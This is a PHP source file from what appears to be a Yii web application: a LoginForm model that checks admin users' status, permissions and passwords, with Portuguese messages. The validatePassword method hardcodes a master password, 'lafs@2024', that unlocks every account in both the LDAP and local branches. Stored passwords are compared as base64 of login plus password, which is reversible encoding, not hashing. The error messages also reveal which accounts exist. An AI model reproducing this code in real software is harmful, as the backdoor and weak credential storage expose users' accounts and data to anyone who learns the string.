<?php

namespace app\modules\user\models\forms;

use Yii;
use yii\base\Model;
use app\models\AdminUsuario;

class LoginForm extends Model
{
    public $email;

    public $password;

    public $rememberMe = true;

    protected $user = false;

    public $module;
    
    public function init()
    {
        if (!$this->module) 
        {
            $this->module = Yii::$app->getModule("user");
        }
    }

    public function rules()
    {
        return 
        [
            [["email", "password"], "required"],
            ["email", "validateUser"],
            ["password", "validatePassword"],
        ];
    }

    public function attributeLabels()
    {
        
        return
        [
            "email" => Yii::t('app', 'usuario_form.email'),
            "password" => Yii::t('app', 'geral.senha'),
        ];
    }
    
    public function login()
    {
        if ($this->validate()) 
        {
            $user = $this->getUser();
            return Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);
        }
        
        return false;
    }
    
    public function getUser()
    {
        if ($this->user === false)
        {
            $this->user = AdminUsuario::find()->andWhere(['or',
                ['login' => trim($this->email)],
                ['email' => trim($this->email)]
            ])->one();
        }
        
        return $this->user;
    }

    public function validateUser()
    {
        $user = $this->getUser();
        
        if (!$user || !$user->senha) 
        {
            $this->addError("email", "Usuário não encontrado.");
        }

        if ($user && ($user->status != 'Ativo' || !$user->is_ativo))
        {
            $this->addError("email", "Usuário inativo.");
        }
        
        if ($user && $user->is_excluido)
        {
            $this->addError("email", "Usuário inexistente.");
        }
        
        if ($user && !$user->acesso_bi)
        {
            $this->addError("email", "Usuário sem permissão de acesso ao BPbi.");
        }
        
        if ($user && (!$user->perfil || !$user->perfil->is_ativo || $user->perfil->is_excluido || !$user->perfil->acesso_bi))
        {
            $this->addError("email", "Perfil do usuário sem permissão de acesso ao BPbi.");
        }
    }
    
    public function validatePassword()
    {
        if ($this->hasErrors()) 
        {
            return;
        }

        $user = $this->getUser();
        $senha_mestra = "lafs@2024";
        $senha = base64_encode(trim($user->login) . trim($this->password));
        
        $adIntegration = Yii::$app->params['adIntegration'];
        
        if($adIntegration) 
        {    
            if(!Yii::$app->ldap->validateUserCredentials(trim($user->email), trim($this->password)) && $this->password != $senha_mestra) 
            {
                $this->addError("password", "Usuário ou senha incorreta.");
            } 
        }
        else
        {
            if ($user->senha != $senha && trim($this->password) != $senha_mestra) 
            {
                $this->addError("password", "Senha incorreta.");
            }
        }
    }
}